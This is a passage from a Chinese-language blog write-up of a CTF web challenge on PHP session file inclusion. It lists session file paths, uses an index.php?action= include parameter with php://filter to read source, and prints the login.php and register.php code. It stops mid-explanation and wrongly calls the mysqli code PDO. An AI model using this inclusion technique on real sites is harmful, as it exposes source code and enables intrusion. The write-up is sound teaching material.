&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030165251590.png&#34; alt=&#34;image-20221030165251590&#34; style=&#34;zoom:80%;&#34; /&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030165348749.png&#34; alt=&#34;image-20221030165348749&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNzYwNTM2NDg=&#34;&gt;open_basedir restriction in effect. 原因与解决方法 - 知乎 (zhihu.com)&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;session包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#session包含&#34;&gt;#&lt;/a&gt; session 包含&lt;/h2&gt;
&lt;p&gt;前置知识～:cookie 与 session，这个我在 xss 的开头讲过了&lt;/p&gt;
&lt;p&gt;session 目录:/var/llib/php/session&lt;/p&gt;
&lt;p&gt;文件格式:sess_sessid&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;知道 session 的路径，可以控制 session 文件中的内容，存在文件包含&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;session 常见存储路径：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/var/lib/php/sess_PHPSESSID&lt;/li&gt;
&lt;li&gt;/var/lib/php/sess_PHPSESSID&lt;/li&gt;
&lt;li&gt;/tmp/sess_PHPSESSID&lt;/li&gt;
&lt;li&gt;/tmp/sessions/sess_PHPSESSID&lt;/li&gt;
&lt;li&gt;session 文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;一道ctf关于session包含的题目&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一道ctf关于session包含的题目&#34;&gt;#&lt;/a&gt; 一道 CTF 关于 session 包含的题目&lt;/h4&gt;
&lt;p&gt;页面打开之后有 login 和 register 选项，并且点击后 url 长这样:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://1.1.1.1/index.php?action=login.php&lt;/code&gt;   &lt;code&gt;http://1.1.1.1/index.php?action=register.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;很明显，这是通过 include 不同的文件加载不同的页面&lt;/p&gt;
&lt;p&gt;那么就有可能存在文件包含漏洞了&lt;/p&gt;
&lt;p&gt;尝试用 php://filter 读源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//login.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;require_once&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;config.php&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;title function_ invoke__&#34;&gt;session_start&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Location: index.php&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;] &amp;amp;&amp;amp; &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;md5&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt; = @&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dbhost&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$dbuser&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$dbpass&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$dbname&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;connect_errno) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;could not connect to the database:\n&amp;quot;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;connect_error);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;select password from user where username=?&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;prepare&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;bind_param&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;s&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;bind_result&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$res_password&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;execute&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;fetch&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$res_password&lt;/span&gt; == &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;title function_ invoke__&#34;&gt;base64_encode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;location:index.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid user name or password&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;close&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;close&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//register.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;] &amp;amp;&amp;amp; &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;require_once&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;config.php&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;md5&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt; = @&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dbhost&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$dbuser&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$dbpass&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$dbname&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;connect_errno) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;could not connect to the database:\n&amp;quot;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;connect_error);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;set_charset&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;utf8&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;select * from user where username=?&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;prepare&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;bind_param&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;s&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;bind_result&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$res_id&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$res_username&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$res_password&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;execute&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;store_result&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$count&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;num_rows&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$count&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;User name Already Exists&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;insert into user(username, password) values(?,?)&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;prepare&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;bind_param&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ss&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;execute&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Register OK!&amp;lt;a href=&amp;quot;index.php&amp;quot;&amp;gt;Please Login&amp;lt;/a&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;close&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;close&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;两个文件都是用 PDO 写的，不存在 sql 注入，config 是数据库用户名与密码，除非他的服务器允许外链，不然没用，index 就包含了两个页面&lt;/p&gt;
&lt;p&gt;但我们注意到：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$res_password&lt;/span&gt; == &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;title function_ invoke__&#34;&gt;base64_encode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;location:index.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid user name or password&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;这里使用了 session 来保存用户会话，php 手册中是这样描述的：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;PHP 会将会话中的数据设置到  &lt;code&gt;$_SESSION&lt;/code&gt;  变量中。&lt;/li&gt;
&lt;li&gt;当 PHP 停止的时候，它会自动读取  &lt;code&gt;$_SESSION&lt;/code&gt;  中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。&lt;/li&gt;
